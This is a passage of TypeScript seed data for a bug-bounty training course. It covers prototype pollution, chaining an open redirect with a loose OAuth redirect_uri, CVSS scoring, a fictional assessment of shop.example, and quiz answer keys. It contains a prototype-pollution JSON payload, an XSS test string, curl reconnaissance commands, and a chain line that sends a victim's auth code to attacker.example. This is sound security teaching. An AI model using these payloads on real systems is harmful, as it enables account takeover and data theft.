              'The mechanism hinges on a special key: `__proto__`. When code merges attacker-controlled data into an object without filtering keys - a common pattern when handling JSON input or query strings - a key named `__proto__` does not become a normal property. It reaches up and writes onto the shared prototype instead. Walk it: an endpoint accepts JSON and deep-merges it into a config object. You send the body below.',
          },
          {
            type: 'code',
            language: 'json',
            filename: 'pollution-payload',
            code: '{ "__proto__": { "isAdmin": true } }',
          },
          {
            type: 'paragraph',
            text:
              'Read what this does. A naive deep-merge walks the keys and, seeing `__proto__`, writes `isAdmin: true` onto the base object prototype rather than onto the config. From that moment, every plain object in the running app that does not define its own `isAdmin` will *inherit* `isAdmin === true`. If somewhere the code checks `if (user.isAdmin)` on an object that never set it, the check now passes. To confirm the pollution took hold without guessing at app logic, a client-side test in the DevTools console is unambiguous: run the payload path, then evaluate `({}).isAdmin`. A fresh empty object should have no such property; if it prints `true`, the shared prototype was polluted. If it prints `undefined`, the merge filtered the key and there is no bug.',
          },
          {
            type: 'list',
            ordered: false,
            items: [
              '**The magic keys** - `__proto__`, and sometimes `constructor.prototype`, are the write paths',
              '**Vulnerable pattern** - a deep merge, clone, or `object[key] = value` with attacker-controlled keys',
              '**Client-side impact** - polluted properties can flow into a DOM sink and become XSS',
              '**Server-side impact** - can alter logic, cause denial of service, or in some setups reach code execution',
              '**The confirm test** - `({}).polluted` returns your value on a brand-new empty object',
            ],
          },
          {
            type: 'paragraph',
            text:
              'Impact is why this optional-looking bug can score high. On the client, a polluted property that later lands in an HTML sink gives XSS. On the server, flipping an inherited flag like `isAdmin` can bypass an authorisation check, and in specific frameworks it chains into remote code execution. In the report, prove the pollution first (the `({}).x` test), then show the concrete downstream effect - the auth bypass or the XSS - because the pollution alone, with no consequence demonstrated, reads as theoretical.',
          },
          {
            type: 'callout',
            variant: 'info',
            title: 'Prove the pollution, then prove the payoff',
            text:
              'The `({}).yourKey` check proves the prototype was polluted. But a report needs the second half too - what that polluted property actually broke.',
          },
          {
            type: 'callout',
            variant: 'danger',
            title: 'Authorised targets only',
            text: 'Sending pollution payloads can change how a live app behaves for other users. Only do it where you have permission to test.',
          },
          {
            type: 'callout',
            variant: 'success',
            title: 'You just unlocked',
            text: 'You understand how one write to a shared prototype spreads across every object, and how to confirm it landed.',
          },
          {
            type: 'quiz',
            question: 'You send {"__proto__":{"isAdmin":true}} and then ({}).isAdmin returns true in the console. What has happened?',
            options: [
              'Nothing - that is normal JavaScript behaviour',
              'The shared object prototype was polluted, so every plain object now inherits isAdmin: true',
              'You created a single new object called isAdmin',
              'The server crashed',
            ],
            correctIndex: 1,
            explanation:
              'A brand-new empty object should have no isAdmin. If it inherits true, the write reached the shared prototype - prototype pollution.',
          },
        ],
      },
    ],
  },
  {
    slug: 'putting-it-together',
    title: 'Putting It Together',
    description:
      'Single findings are worth something; a story is worth more. This module turns scattered bugs into one assessment: how to chain small issues into a big one, how to score impact honestly with a CVSS vector a triager will accept, and how a real target goes from blank recon to three written-up findings. By the end you can take what you found and present it like someone who gets paid.',
    lessons: [
      {
        slug: 'chaining-vulnerabilities',
        title: 'Chaining Vulnerabilities',
        summary: 'Two "meh" bugs can add up to one critical. The chain is the finding, not the parts.',
        estimatedMinutes: 9,
        importance: 'core',
        blocks: [
          {
            type: 'paragraph',
            text:
              'Chaining is stitching several low-value bugs into one high-value attack. On their own each link might get closed as "informational" or "low". Connected in the right order, they become a full account takeover or data breach - and the report gets paid on the impact of the whole chain, not the parts. Learning to see the links is what separates a bug reporter from a bug hunter.',
          },
          {
            type: 'paragraph',
            text:
              'Think of a heist told step by step: a propped fire door, a guard who takes a chai break at 4pm, and a master key left in a drawer. Each fact is minor. Put them in sequence and someone walks out with the safe. Vulnerabilities work the same way - a leak here, a weak check there, and a redirect that trusts input become a single path from stranger to admin.',
          },
          {
            type: 'paragraph',
            text:
              'Walk one real chain end to end. Start with an **open redirect** on `example.com/go?url=` - low severity alone, because "it just sends users elsewhere". Next you find the OAuth login sends its authorisation code back to a `redirect_uri` that trusts any `example.com` URL. Now connect them: you craft a login link whose `redirect_uri` points at the open-redirect endpoint, which then bounces to your server carrying the victim\'s authorisation code. You exchange that code for their token. Two "low" bugs - an open redirect and a loose redirect check - just became a full account takeover. Neither alone was worth much; the chain is critical.',
          },
          {
            type: 'list',
            ordered: false,
            items: [
              '**Info disclosure -> targeted attack** - a leaked internal path or username makes the next step precise',
              '**Open redirect -> token/OAuth theft** - the redirect carries a secret to the attacker',
              '**Self-XSS + CSRF -> real XSS** - CSRF plants the payload the victim could not plant themselves',
              '**IDOR -> mass data access** - one ID swap that scales to every record',
              '**SSRF -> cloud metadata -> credentials** - reach an internal endpoint, then read the keys behind it',
            ],
          },
          {
            type: 'code',
            language: 'text',
            filename: 'the-chain-written-out',
            code:
              'Link 1: open redirect   /go?url=https://attacker.example\nLink 2: OAuth redirect_uri accepts any example.com URL\nChain:  /oauth/authorize?...&redirect_uri=https://example.com/go?url=https://attacker.example\nResult: victim\'s auth code delivered to attacker -> exchanged for token -> account takeover',
          },
          {
            type: 'paragraph',
            text:
              'Read the chain as written. Link 1 and Link 2 are each the small bugs you would normally file separately. The `Chain` line is the single request that abuses both: the OAuth endpoint accepts the `redirect_uri` because it *is* an `example.com` URL, then that URL open-redirects to the attacker, dragging the authorisation code out of the trusted domain. The `Result` line is the sentence that sets the severity. When you write this up, you lead with the result and impact, then show each link as a step - a triager needs to follow the whole path to agree it is critical.',
          },
          {
            type: 'paragraph',
            text:
              'The hunter\'s habit here is to keep a running list of every small thing you find, even the ones not worth reporting alone, and constantly ask "what does this let me reach next?". A leaked username is boring until it feeds a password reset. An open redirect is boring until it carries a token. The value is in the connection, so you note the links and look for the sequence.',
          },
          {
            type: 'callout',
            variant: 'info',
            title: 'Keep a junk drawer of low findings',
            text:
              'Do not throw away the lows. Write them down. The open redirect you almost skipped is often the middle link of a critical chain you find an hour later.',
          },
          {
            type: 'callout',
            variant: 'danger',
            title: 'Test the whole chain only where allowed',
            text: 'A chain that ends in account takeover is a real compromise. Build and demonstrate it only against a target you are authorised to test.',
          },
          {
            type: 'callout',
            variant: 'success',
            title: 'You just unlocked',
            text: 'You can connect small, low-severity bugs into a single high-impact chain and report it on the impact of the whole path.',
          },
          {
            type: 'quiz',
            question: 'Why does an open redirect, often "low" on its own, sometimes become part of a critical finding?',
            options: [
              'It crashes the server',
              'It can carry a secret like an OAuth authorisation code out to the attacker, enabling account takeover',
              'It is always critical on its own',
              'It reveals the database password directly',
            ],
            correctIndex: 1,
            explanation:
              'Chained with a loose OAuth redirect_uri check, an open redirect leaks the auth code to the attacker, turning two low bugs into an account takeover.',
          },
        ],
      },
      {
        slug: 'impact-and-severity-cvss',
        title: 'Impact and Severity (CVSS)',
        summary: 'First explain the damage in plain words. Then translate it into the score triagers actually use.',
        estimatedMinutes: 9,
        importance: 'core',
        blocks: [
          {
            type: 'paragraph',
            text:
              'Severity is your answer to "how bad is this, really?". Programs and triagers use a shared scoring system called CVSS to turn that answer into a number from 0 to 10, which maps to Low / Medium / High / Critical. But the number is the second step. First you must be able to say the impact in plain words, because a score with no story behind it convinces nobody - and a great story with the wrong score gets argued down.',
          },
          {
            type: 'paragraph',
            text:
              'Plain-words impact answers three questions: what can an attacker read or change that they should not, who is affected (one user they must trick, or everyone automatically), and what do they need to pull it off (nothing, a login, a click). "Any logged-in user can read any other user\'s invoices by changing one number, no interaction needed" is a complete impact sentence. Notice it never mentions CVSS - it just states the damage clearly.',
          },
          {
            type: 'heading',
            level: 3,
            text: 'One vector, field by field',
          },
          {
            type: 'paragraph',
            text:
              'CVSS builds the score from a set of metrics, each a single letter. Take a stored XSS that fires in any user\'s browser with no login needed and no click. Its base vector looks like the line below - read it left to right.',
          },
          {
            type: 'code',
            language: 'text',
            filename: 'cvss-3.1-vector',
            code: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N   ->  8.2 (High)',
          },
          {
            type: 'paragraph',
            text:
              'Read each field. **AV:N** (Attack Vector: Network) - reachable over the internet, the most exposed option. **AC:L** (Attack Complexity: Low) - no special conditions needed. **PR:N** (Privileges Required: None) - the attacker needs no account. **UI:R** (User Interaction: Required) - a victim has to load the page for the stored script to fire. **S:C** (Scope: Changed) - the bug in the web app reaches beyond it, into the victim\'s browser session, which raises the score. **C:H** (Confidentiality: High) - it can steal the session and read the victim\'s data. **I:L** (Integrity: Low) - it can make some changes as the victim. **A:N** (Availability: None) - it does not take the service down. Those letters combine to 8.2, which lands in the High band. Change one honest fact - say the payload needs no interaction at all (**UI:N**) - and the score climbs; inflating a field you cannot justify is how you lose credibility with a triager.',
          },
          {
            type: 'list',
            ordered: false,
            items: [
              '**AV** Attack Vector - Network / Adjacent / Local / Physical',
              '**AC** Attack Complexity - Low or High',
              '**PR** Privileges Required - None / Low / High',
              '**UI** User Interaction - None or Required',
              '**S** Scope - Unchanged or Changed (does the impact escape the vulnerable component?)',
              '**C / I / A** - Confidentiality, Integrity, Availability impact - None / Low / High',
            ],
          },
          {
            type: 'paragraph',
            text:
              'The working habit: write the plain-words impact first, then set each CVSS metric to match a fact you can defend, then let the calculator produce the number. Do not start from the number you want and reverse-engineer the letters. A triager reads the same vector; if your **PR:N** is actually **PR:L** because the attack needs a login, they will re-score it and trust the rest of your report less. Honest and slightly lower beats inflated and disputed.',
          },
          {
            type: 'callout',
            variant: 'info',
            title: 'Impact sentence beats a bare number',
            text:
              'Lead your report with "who can do what to whom, and what they need". The CVSS vector supports that sentence - it does not replace it.',
          },
          {
            type: 'callout',
            variant: 'success',
            title: 'Level up',
            text: 'You can state a bug\'s impact in plain words and back it with a CVSS vector you can defend field by field.',
          },
          {
            type: 'quiz',
            question: 'In a CVSS vector, what does PR:N mean?',
            options: [
              'The attack needs physical access',
              'Privileges Required: None - the attacker needs no account to exploit it',
              'The bug has no impact',
              'The proof is not required',
            ],
            correctIndex: 1,
            explanation:
              'PR is Privileges Required. PR:N means no account is needed, which raises the score compared with PR:L (needs a login) or PR:H (needs admin).',
          },
        ],
      },
      {
        slug: 'a-full-web-assessment-walkthrough',
        title: 'A Full Web Assessment, Start to Finish',
        summary: 'One fictional target, from blank page to three written-up findings - watching the decision at every step.',
        estimatedMinutes: 12,
        importance: 'core',
        blocks: [
          {
            type: 'paragraph',
            text:
              'This is the capstone: everything from the level applied to one target, in order, with the reasoning shown. The target is fictional - `shop.example`, an in-scope e-commerce site with a login, a product catalogue, user profiles, and an admin area. You have written authorisation to test it. The goal is not to list every tool you know; it is to show the decision at each step - why you look here next, and when a clue becomes a finding.',
          },
          {
            type: 'heading',
            level: 3,
            text: 'Step 1 - Recon: map before you touch',
          },
          {
            type: 'paragraph',
            text:
              'You start by understanding the app, not attacking it. You browse every page as a normal user, watching the requests in your proxy. You note the endpoints: `/login`, `/products/{id}`, `/account/orders`, `/api/users/{id}`, `/admin`. You run light content discovery and find `/backups/` responds. That single observation - a folder that answers - is the first thread to pull.',
          },
          {
            type: 'command',
            description: 'Confirm the folder and read what it exposes:',
            commands: ['curl -sI https://shop.example/backups/', 'curl -s https://shop.example/backups/ | head -n 20'],
          },
          {
            type: 'paragraph',
            text:
              'The headers come back `200 OK` and the body is an "Index of /backups" listing containing `db-2024.sql`. That is **Finding 1: unauthenticated directory listing exposing a database backup** - a security misconfiguration, and a serious one because the file name promises user data. You note it exists and grab only enough to prove it (the listing itself), without hoarding the dump. Decision made: this is confirmed, logged, move on rather than rabbit-holing.',
          },
          {
            type: 'heading',
            level: 3,
            text: 'Step 2 - Test authorisation: change the number',
          },
          {
            type: 'paragraph',
            text:
              'Logged in as your own user (id 42), you open your order and see the request `GET /api/users/42/orders`. The obvious test is to change `42` to `43`. You send it and the response returns another user\'s order history - name, address, items. That is **Finding 2: IDOR exposing any user\'s orders**, and because it needs only a login and one changed number, with no interaction from the victim, it scores higher than the misconfiguration. The decision here was to test the boldest cheap hypothesis first: authorisation checks are the most common miss, so you tried the ID swap before anything fancier.',
          },
          {
            type: 'heading',
            level: 3,
            text: 'Step 3 - Look for a chain, not just a list',
          },
          {
            type: 'paragraph',
            text:
              'On your profile page you set your display name to `<script>alert(document.domain)</script>` and it is stored plainly. It does not fire on your own profile - the profile page escapes it. But you remember the admin area lists users. You have no admin access to check directly, so you report it as a suspected **Finding 3: stored XSS via display name, likely firing in the admin user list** and describe the mechanism precisely rather than claiming what you cannot see. The decision: do not overclaim. You state what you confirmed (the payload is stored unescaped) and what you infer (where it probably fires), keeping them clearly separate.',
          },
          {
            type: 'list',
            ordered: false,
            items: [
              '**Finding 1** - directory listing at `/backups/` exposing `db-2024.sql` (misconfiguration)',
              '**Finding 2** - IDOR at `/api/users/{id}/orders`, any logged-in user reads any orders',
              '**Finding 3** - stored XSS via display name, suspected to fire in the admin user list',
              '**The decisions** - confirm and move on, test the cheapest bold hypothesis first, never overclaim',
            ],
          },
          {
            type: 'paragraph',
            text:
              'Now you write it up. Each finding gets a plain-words impact sentence, a CVSS vector you can defend, clear reproduction steps, and evidence. You order them by severity: the IDOR (mass data access, no interaction) leads, the exposed backup follows, the suspected stored XSS comes last with its uncertainty stated honestly. That ordered, evidence-backed report is the actual deliverable - the finding is only worth what your write-up makes a triager believe.',
          },
          {
            type: 'callout',
            variant: 'info',
            title: 'A confirmed low beats a maybe-critical',
            text:
              'Two solid, reproducible findings you can prove are worth more than one dramatic claim you cannot. Report what you can demonstrate, and mark inference as inference.',
          },
          {
            type: 'callout',
            variant: 'danger',
            title: 'Every step here is authorised testing',
            text: 'This whole walkthrough - the ID swaps, the payloads, reading the backup listing - is only legal on a target you have written permission to test.',
          },
          {
            type: 'callout',
            variant: 'success',
            title: 'Locked in',
            text: 'You can run an assessment end to end - recon, test, chain, score, write up - and make a defensible decision at every step.',
          },
          {
            type: 'practice_ref',
            title: 'Putting It Together check',
            exerciseSlug: 'putting-it-together-quiz',
          },
          {
            type: 'quiz',
            question: 'During the assessment you find a payload is stored unescaped but cannot see the admin page where it would fire. How should you report it?',
            options: [
              'Claim a confirmed admin account takeover for the highest payout',
              'Skip it entirely since you cannot see it fire',
              'Report the confirmed stored-unescaped behaviour and clearly mark where it likely fires as inference',
              'Wait until you gain admin access by any means necessary',
            ],
            correctIndex: 2,
            explanation:
              'State what you proved and mark what you infer as inference. Overclaiming loses a triager\'s trust; skipping a real stored payload wastes a finding.',
          },
        ],
      },
    ],
  },
];

export const EXERCISES: ExerciseSeed[] = [
  {
    lessonSlug: 'default-credentials-and-panels',
    slug: 'misconfig-and-disclosure-quiz',
    title: 'Misconfiguration and Disclosure check',
    instructions: 'Five quick ones. Get four right and the module is yours.',
    kind: 'quiz',
    xpReward: 25,
    questions: [
      {
        prompt: 'A server responds to /uploads/ with an "Index of /uploads" page listing files. What is this?',
        options: [
          'A code bug in the upload feature',
          'Directory listing left enabled - a security misconfiguration',
          'A SQL injection point',
          'Normal, required behaviour',
        ],
        correctIndex: 1,
        explanation: 'No index page plus listing enabled means the server exposes folder contents. That is a misconfiguration, not a code flaw.',
      },
      {
        prompt: 'A profile page shows only a name, but the raw JSON also returns "email" and "role". This is:',
        options: [
          'A harmless rendering quirk',
          'Information disclosure - the API sends more than the UI shows',
          'A CSRF vulnerability',
          'Expected, because JSON always sends every field',
        ],
        correctIndex: 1,
        explanation: 'Hiding a field in the UI does not protect it. Returning sensitive data to a caller who should not see it is information disclosure.',
      },
      {
        prompt: 'A site is missing the X-Frame-Options header. When is this a reportable finding?',
        options: [
          'Always - a missing header is automatically a bug',
          'Never - headers are cosmetic',
          'When paired with a working clickjacking attack on a sensitive action',
          'Only when the site is on HTTP',
        ],
        correctIndex: 2,
        explanation: 'A missing header alone is usually informational. It becomes a finding when combined with a demonstrated attack.',
      },
      {
        prompt: 'You find a public admin panel and the documented vendor default login works on the first try. Why is this high impact?',
        options: [
          'It proves the site has XSS',
          'A working admin login usually means full control of the application',
          'It only affects the login page',
          'It is low impact because the password was guessed',
        ],
        correctIndex: 1,
        explanation: 'Administrator access typically controls all data and settings, which is why exposed panels with default creds score critically.',
      },
      {
        prompt: 'A malformed request returns a stack trace with a file path, the MySQL engine, and the failing query. The most useful lead beyond the disclosure is:',
        options: [
          'That HSTS is missing',
          'That the echoed query and DB error point toward possible SQL injection',
          'That the site can be clickjacked',
          'Nothing - a trace is only cosmetic',
        ],
        correctIndex: 1,
        explanation: 'The leaked query and DB error reveal the backend and a real table, suggesting input reaches the query unescaped - a pointer toward SQLi.',
      },
    ],
  },
  {
    lessonSlug: 'websocket-security',
    slug: 'client-side-extras-quiz',
    title: 'Client-Side Extras check',
    instructions: 'Five quick ones. Get four right and the module is yours.',
    kind: 'quiz',
    xpReward: 25,
    questions: [
      {
        prompt: 'A target page loads inside your iframe. When is that actually a clickjacking finding?',
        options: [
          'Always - any frameable page is a bug',
          'Only when a single click on the framed page triggers a sensitive, state-changing action',
          'Only if the page uses HTTP',
          'Never - framing is always harmless',
        ],
        correctIndex: 1,
        explanation: 'Framing only matters when one click triggers something dangerous. Framing a read-only page changes nothing.',
      },
      {
        prompt: 'What makes Cross-Site WebSocket Hijacking possible?',
        options: [
          'Using plaintext ws:// instead of wss://',
          'The server authorises the socket on the auto-sent cookie without checking the Origin header',
          'The victim clicking a link inside the chat',
          'The WebSocket protocol being broken by design',
        ],
        correctIndex: 1,
        explanation: 'Cookies attach to the handshake automatically. If the server trusts that cookie and ignores Origin, any site can open the socket as the victim.',
      },
      {
        prompt: 'A message handler writes event.data into innerHTML. What is the core flaw?',
        options: [
          'postMessage is insecure and should never be used',
          'The handler does not verify event.origin and feeds untrusted data into a dangerous sink',
          'The page uses an iframe',
          'The message travels over HTTP',
        ],
        correctIndex: 1,
        explanation: 'A safe handler checks event.origin against an allowlist and treats event.data as untrusted. Missing both turns postMessage into an XSS route.',
      },
      {
        prompt: 'After sending {"__proto__":{"isAdmin":true}}, ({}).isAdmin returns true in the console. What happened?',
        options: [
          'Normal JavaScript behaviour',
          'The shared object prototype was polluted, so every plain object now inherits isAdmin: true',
          'A single object named isAdmin was created',
          'The server crashed',
        ],
        correctIndex: 1,
        explanation: 'A brand-new empty object should have no isAdmin. Inheriting true means the write reached the shared prototype - prototype pollution.',
      },
      {
        prompt: 'Where should you look first to spot a WebSocket that trusts the wrong origin?',
        options: [
          'The rendered HTML of the chat page',
          'The HTTP handshake request that upgrades the connection',
          'The favicon',
          'The CSS file',
        ],
        correctIndex: 1,
        explanation: 'A WebSocket opens with an ordinary HTTP request. Inspect that handshake to see whether the server validates Origin before upgrading.',
      },
    ],
  },
  {
    lessonSlug: 'a-full-web-assessment-walkthrough',
    slug: 'putting-it-together-quiz',
    title: 'Putting It Together check',
    instructions: 'Five quick ones. Get four right and the module is yours.',
    kind: 'quiz',
    xpReward: 25,
    questions: [
      {
        prompt: 'Why can an open redirect, "low" on its own, become part of a critical finding?',
        options: [
          'It crashes the server',
          'It can carry a secret like an OAuth auth code out to the attacker, enabling account takeover',
          'It is always critical alone',
          'It reveals the database password',
        ],
        correctIndex: 1,
        explanation: 'Chained with a loose OAuth redirect_uri check, an open redirect leaks the auth code to the attacker - two low bugs become an account takeover.',
      },
      {
        prompt: 'In a CVSS vector, what does PR:N mean?',
        options: [
          'The attack needs physical access',
          'Privileges Required: None - no account is needed to exploit it',
          'The bug has no impact',
          'A proof is not required',
        ],
        correctIndex: 1,
        explanation: 'PR is Privileges Required. PR:N means no account is needed, which raises the score versus PR:L or PR:H.',
      },
      {
        prompt: 'What does CVSS Scope: Changed (S:C) indicate?',
        options: [
          'The bug was recently changed',
          'The impact escapes the vulnerable component and affects another (e.g. the victim\'s browser session)',
          'The attacker changed the URL',
          'The severity is lower',
        ],
        correctIndex: 1,
        explanation: 'Scope: Changed means the impact reaches beyond the vulnerable component, which raises the score - common with XSS affecting the browser.',
      },
      {
        prompt: 'You confirm a payload is stored unescaped but cannot see the admin page where it would fire. How do you report it?',
        options: [
          'Claim a confirmed admin takeover for the highest payout',
          'Skip it since you cannot see it fire',
          'Report the confirmed stored-unescaped behaviour and mark where it likely fires as inference',
          'Gain admin access by any means to confirm',
        ],
        correctIndex: 2,
        explanation: 'State what you proved and mark inference as inference. Overclaiming loses trust; skipping a real stored payload wastes a finding.',
      },
      {
        prompt: 'What is the best working habit for building an attack chain?',
        options: [
          'Discard every low-severity finding immediately',
          'Keep a running list of small findings and ask what each one lets you reach next',
          'Report each bug the instant you find it and never revisit',
          'Only chase bugs a scanner already flagged',
        ],
        correctIndex: 1,
        explanation: 'The value is in the connection. Noting the lows and asking "what does this reach next?" is how a leaked username or open redirect becomes a critical chain.',
      },
    ],
  },
];
